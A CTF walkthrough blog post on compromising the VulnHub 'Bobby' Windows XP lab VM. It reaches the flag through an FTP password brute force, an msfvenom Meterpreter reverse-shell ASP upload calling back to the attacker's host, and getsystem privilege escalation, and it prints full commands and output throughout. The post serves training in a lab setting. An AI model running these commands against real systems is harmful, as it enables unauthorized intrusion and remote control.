---
layout: single
title: How I Hacked Bobby
date: 2017-06-04
categories:
  - security
  - ctf
  - walkthrough
tags:
  - bobby
  - vulnhub
---
The Bobby CTF is based on a Windows XP Pro SP3 VM with the objective of retrieving the flag found somewhere within the administrator's personal folder.

The VM can be downloaded from [VulnHub](https://www.vulnhub.com/entry/bobby-1,42/) and must be setup using [VulnInjector](https://blog.vulnhub.com/introducing-vulninjector/), due to the licensing implications of providing a free Windows VM.

## Service Fingerprinting
As the virtual machine comes pre-configured with a static IP address of `192.168.1.11`, I skipped host discovery and began looking for and fingerprinting services instead.

I loaded up Metasploit [`msfconsole`] and began an Nmap scan with the `sV` flags to fingerprint the discovered services:

```shell_session
msf > db_nmap -sV 192.168.1.11
[*] Nmap: Starting Nmap 7.40 ( https://nmap.org ) at 2017-06-03 16:47 BST
[*] Nmap: Nmap scan report for 192.168.1.11
[*] Nmap: Host is up (0.00026s latency).
[*] Nmap: Not shown: 997 filtered ports
[*] Nmap: PORT    STATE  SERVICE VERSION
[*] Nmap: 21/tcp  open   ftp     Microsoft ftpd
[*] Nmap: 80/tcp  open   http    Microsoft IIS httpd 5.1
[*] Nmap: 443/tcp closed https
[*] Nmap: MAC Address: 08:00:27:12:1D:ED (Oracle VirtualBox virtual NIC)
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 23.97 seconds
```

The results showed that the IIS 5.1 HTTP and FTP services were running.

## Looking Further into IIS
With IIS 5.1 identified, I used Metasploit to check if WebDAV is enabled, which it wasn't:

```shell_session
msf > use auxiliary/scanner/http/webdav_scanner
msf auxiliary(webdav_scanner) > hosts -R

Hosts
=====

address       mac                name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---                ----  -------  ---------  -----  -------  ----  --------
192.168.1.11  08:00:27:12:1d:ed        Unknown                    device         

RHOSTS => 192.168.1.11

msf auxiliary(webdav_scanner) > run

[*] 192.168.1.11 (Microsoft-IIS/5.1) WebDAV disabled.
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(webdav_scanner) >
```
I then checked to see what Nikto could find:

```shell_session
root@kali:~# nikto -host 192.168.1.11
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.11
+ Target Hostname:    192.168.1.11
+ Target Port:        80
+ Start Time:         2017-06-03 17:03:17 (GMT1)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/5.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, PUT, DELETE
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-877: HTTP TRACK method is active, suggesting the host is vulnerable to XST
+ OSVDB-3092: /localstart.asp: This may be interesting...
+ /portal/changelog: Vignette richtext HTML editor changelog found.
+ 7684 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2017-06-03 17:03:33 (GMT1) (16 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

The `localstart.asp` file which Nikto identified requires HTTP authentication in order to view and the change log doesn't seem to exist.

Next, I ran dirb using the IIS vulnerability word list bundled with Kali:

```shell_session
root@kali:~# dirb http://192.168.1.11 /usr/share/dirb/wordlists/vulns/iis.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Jun  3 17:10:39 2017
URL_BASE: http://192.168.1.11/
WORDLIST_FILES: /usr/share/dirb/wordlists/vulns/iis.txt

-----------------

GENERATED WORDS: 58                                                            

---- Scanning URL: http://192.168.1.11/ ----
+ http://192.168.1.11/iisadmin (CODE:403|SIZE:4083)                                                                                                                                                                                                                             
+ http://192.168.1.11/printers (CODE:401|SIZE:4431)                                                                                                                                                                                                                             

-----------------
END_TIME: Sat Jun  3 17:10:39 2017
DOWNLOADED: 58 - FOUND: 2
```

Both directories that dirb found were not viewable, `/iisadmin` was seemingly restricted to local access from the server side, and `/printers` required HTTP authentication; possibly sharing the same credentials as `/localstart.asp`.

## Bypassing HTTP Authentication
A quick search of the Metasploit IIS modules revealed that there is an auxiliary module (`auxiliary/admin/http/iis_auth_bypass`) which may help bypass the authentication on the URLs found using Nikto and dirb:

> This module bypasses basic authentication for Internet Information
Services (IIS). By appending the NTFS stream name to the directory
name in a request, it is possible to bypass authentication.

The first path I tried this with was `/printers`, but it failed:

```shell_session
msf auxiliary(iis_auth_bypass) > set RHOST 192.168.1.11
RHOST => 192.168.1.11
msf auxiliary(iis_auth_bypass) > set TARGETURI /printers
TARGETURI => /printers
msf auxiliary(iis_auth_bypass) > run

[-] The bypass attempt did not work
[*] Auxiliary module execution completed
```

Nor did it work for `/localstart.asp`

```shell_session
msf auxiliary(iis_auth_bypass) > set TARGETURI /localstart.asp
TARGETURI => /localstart.asp
msf auxiliary(iis_auth_bypass) > run

[-] The bypass attempt did not work
[*] Auxiliary module execution completed
```

After this module failed to bypass the authentication, I searched around and found [CVE-2010-2731](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2731); a vulnerability which allows the bypassing of authentication by appending `:$i30:$INDEX_ALLOCATION` to the end of adirectory name in the GET request. I tried this with both `/iisadmin` and `/printers`, but both still prompted for authentication.

## HTTP Brute Forcing
As exploiting vulnerabilities to bypass authentication wasn't working, I used CeWL to create a custom word list based on the home page that was being served from IIS in an attempt to brute force the login.

Given it was the personal page of Bobby with a small bio, there were some keywords that could be picked up and mutated.


```shell_session
root@kali:~# cewl -w bobby_words.txt -v http://192.168.1.11
CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
Starting at http://192.168.1.11
Visiting: http://192.168.1.11, got response code 200
Attribute text found:


Writing words to file
root@kali:~# cat bobby_words.txt
Favourite
Bobby
TheXero
blog
sounds
more
not
Robert
Bob
Welcome
personal
blogging
website
but
here
are
few
things
about
film
Matrix
reloaded
music
artist
Daft
Punk
Windows
root@kali:~#
```

I then refactored the word list further to remove unlikely passwords and to include "thematrix" and merge "Daft" and "Punk" together:

```
Bobby
TheXero
Robert
Bob
Matrix
music
Windows
thematrix
daftpunk
```

Once the word list was ready, I used the `auxiliary/scanner/http/http_login` Metasploit module to attempt the brute force, but all attempts failed:

```shell_session
msf > use auxiliary/scanner/http/http_login
msf auxiliary(http_login) > set PASS_FILE bobby_words.txt
PASS_FILE => bobby_words.txt
msf auxiliary(http_login) > set USER_FILE bobby_words.txt
USER_FILE => bobby_words.txt
msf auxiliary(http_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(http_login) > set AUTH_URI /localstart.asp
AUTH_URI => /localstart.asp
msf auxiliary(http_login) > set RHOSTS 192.168.1.11
RHOSTS => 192.168.1.11
msf auxiliary(http_login) > run

****

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Getting FTP Access
All the attempts I had made on the HTTP server had failed, with no clear way to continue on that front, so I moved on to looking into the FTP server to see what was possible.

Searching Metasploit for Windows FTP exploits revealed [MS09-053](https://technet.microsoft.com/en-us/library/security/ms09-053.aspx) - a buffer overflow which can lead to remote code execution:

>  This module exploits a stack buffer overflow flaw in the Microsoft
  IIS FTP service. The flaw is triggered when a special NLST argument
  is passed while the session has changed into a long directory path.
  For this exploit to work, the FTP server must be configured to allow
  write access to the file system (either anonymously or in
  conjunction with a real account)

I suspected there's not much chance that anonymous FTP access would be enabled, but decided to test for it anyway, just in case:

```shell_session
msf > use auxiliary/scanner/ftp/anonymous
msf auxiliary(anonymous) > hosts -R

Hosts
=====

address       mac                name          os_name     os_flavor  os_sp  purpose  info  comments
-------       ---                ----          -------     ---------  -----  -------  ----  --------
192.168.1.11  08:00:27:12:1d:ed  192.168.1.11  Windows XP                    client         

RHOSTS => 192.168.1.11

msf auxiliary(anonymous) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

As my suspicions were correct, I next decided to try the word list I had previously generated with the FTP server, in case the FTP server and HTTP server weren't using shared credentials for authentication:

```shell_session
msf > use auxiliary/scanner/ftp/ftp_login
msf auxiliary(ftp_login) > hosts -R

Hosts
=====

address       mac                name          os_name     os_flavor  os_sp  purpose  info  comments
-------       ---                ----          -------     ---------  -----  -------  ----  --------
192.168.1.11  08:00:27:12:1d:ed  192.168.1.11  Windows XP                    client         

RHOSTS => 192.168.1.11

msf auxiliary(ftp_login) > set BRUTEFORCE_SPEED 3
BRUTEFORCE_SPEED => 3
msf auxiliary(ftp_login) > set PASS_FILE bobby_words.txt
PASS_FILE => bobby_words.txt
msf auxiliary(ftp_login) > set STOP_ON_SUCCESS true
STOP_ON_SUCCESS => true
msf auxiliary(ftp_login) > set USERNAME bobby
USERNAME => bobby
msf auxiliary(ftp_login) > run

[*] 192.168.1.11:21       - 192.168.1.11:21 - Starting FTP login sweep
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bobby:Bobby (Incorrect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bobby:TheXero (Incorrect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bobby:Robert (Incorrect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bobby:Bob (Incorrect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bobby:Matrix (Incorrect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bobby:music (Incorrect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bobby:Windows (Incorrect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bobby:TheMatrix (Incorrect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bobby:DaftPunk (Incorrect: )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

No attempts were successful with the username "bobby", so I proceeded to try again using the usernames "bob" and "robert", but hit a lockout in the process due to too many incorrect attempts being made ("Unable to Connnect" == locked out):

```shell_session
msf auxiliary(ftp_login) > set USERNAME bob
USERNAME => bob
msf auxiliary(ftp_login) > run

[*] 192.168.1.11:21       - 192.168.1.11:21 - Starting FTP login sweep
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bob:Bobby (Incorrect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bob:TheXero (Unable to Connect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bob:Robert (Unable to Connect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bob:Bob (Unable to Connect: )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

I waited for 5-10 minutes for the lockout to expire, and then resumed the brute force and managed to get a successful login with `bob:Matrix`:

```shell_session
msf auxiliary(ftp_login) > run

[*] 192.168.1.11:21       - 192.168.1.11:21 - Starting FTP login sweep
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bob:Bobby (Incorrect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bob:TheXero (Incorrect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bob:Robert (Incorrect: )
[-] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN FAILED: bob:Bob (Incorrect: )
[+] 192.168.1.11:21       - 192.168.1.11:21 - LOGIN SUCCESSFUL: bob:Matrix
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Getting a Shell
Now that I had a valid set of credentials to login with, I decided to try the previously found buffer overflow exploit, but had no success in getting it to work:

```shell_session
msf > use exploit/windows/ftp/ms09_053_ftpd_nlst
msf exploit(ms09_053_ftpd_nlst) > set FTPUSER bob
FTPUSER => bob
msf exploit(ms09_053_ftpd_nlst) > set FTPPASS Matrix
FTPPASS => Matrix
msf exploit(ms09_053_ftpd_nlst) > set RHOST 192.168.1.11
RHOST => 192.168.1.11
msf exploit(ms09_053_ftpd_nlst) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(ms09_053_ftpd_nlst) > set LHOST 192.168.1.4
LHOST => 192.168.1.4
msf exploit(ms09_053_ftpd_nlst) > run

[*] Started reverse TCP handler on 192.168.1.4:4444
[*] 192.168.1.11:21 - 257 "DZPWDEGPWS" directory created.
[*] 192.168.1.11:21 - 250 CWD command successful.
[*] 192.168.1.11:21 - Creating long directory...
[*] 192.168.1.11:21 - 257 "BVP�UURU5UUUU@�8QEPHu�@@@@���PKBFWFVEHNMDOYXKDRRDYQLMVMMHFMROVNDCQBMCIPNIJOOIDTUUMXHGKPHRTZTHQ����UTDJPJZUEGNWVVGWBXHZAFXZSBCSEPORVUYCKJUOZG����������$=w�����ZKNDAKKWCR�f�����OXGJMCTLYOCOUQISFOVKIEN" directory created.
[*] 192.168.1.11:21 - 200 PORT command successful.
[*] 192.168.1.11:21 - Trying target Windows 2000 SP4 English/Italian (IIS 5.0)...
[*] 192.168.1.11:21 - 150 Opening ASCII mode data connection for file list.
[*] Exploit completed, but no session was created.
```

As this exploit wasn't working for me, I proceeded to generate a Meterpreter payload manually using msfvenom and uploaded it to the public folder:

```shell_session
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp --format asp LHOST=192.168.1.4 -o shell.asp
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of asp file: 38315 bytes
Saved as: shell.asp

root@kali:~# ftp 192.168.1.11
Connected to 192.168.1.11.
220 Microsoft FTP Service
Name (192.168.1.11:root): bob
331 Password required for bob.
Password:
230 User bob logged in.
Remote system type is Windows_NT.
ftp> cd wwwroot
250 CWD command successful.
ftp> put shell.asp
local: shell.asp remote: shell.asp
200 PORT command successful.
150 Opening ASCII mode data connection for shell.asp.
226 Transfer complete.
38385 bytes sent in 0.00 secs (25.3510 MB/s)
ftp> ls -l
200 PORT command successful.
150 Opening ASCII mode data connection for /bin/ls.
12-08-11  01:56PM               272367 backgroup.jpg
12-10-11  02:55PM                  101 hint.html
02-12-13  12:46PM                 1228 index.html
06-03-17  09:14PM                38385 shell.asp
226 Transfer complete.
```

Whilst checking that `shell.asp` had uploaded, I noticed there was also a file named `hint.html`, which I decided to take a look at (even if it was possibly a bit late):

```shell_session
root@kali:~# curl http://192.168.1.11/hint.html
#1 This very common Windows file is not downloaded or interpretered but rather executed server side
```

I wasn't (and I am still not) 100% sure what this hint was referring to, so I continued to setup the handler in Metasploit for the reverse shell:

```shell_session
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.4
LHOST => 192.168.1.4
msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.1.4:4444
[*] Starting the payload handler...
```

Once the TCP handler was setup and listening for connections, I proceeded to execute the shell script on the server by executing `curl http://192.168.1.11/shell.asp` and successfully got shell access:

```shell_session
[*] Sending stage (957487 bytes) to 192.168.1.11
[*] Meterpreter session 1 opened (192.168.1.4:4444 -> 192.168.1.11:1038) at 2017-06-03 21:18:03 +0100

meterpreter > sysinfo
Computer        : BOBBY
OS              : Windows XP (Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

## Getting System Privileges
Metasploit provides a very useful command (`getsystem`) in Meterpreter for Windows sessions, which will automate a variety of privilege escalation methods. My first instinct was to try using this command and on the first attempt, it successfully escalated to the SYSTEM user:

```shell_session
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Now that I had access to the entire file system, I fished around in the administrator's user folder a bit, found the flag on the desktop, and successfully completed the CTF!

```shell_session
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  32    fil   2013-02-04 22:25:26 +0000  secret.txt

meterpreter > cat secret.txt
ab74f8217d5619acb2b708c7bdc50748
```
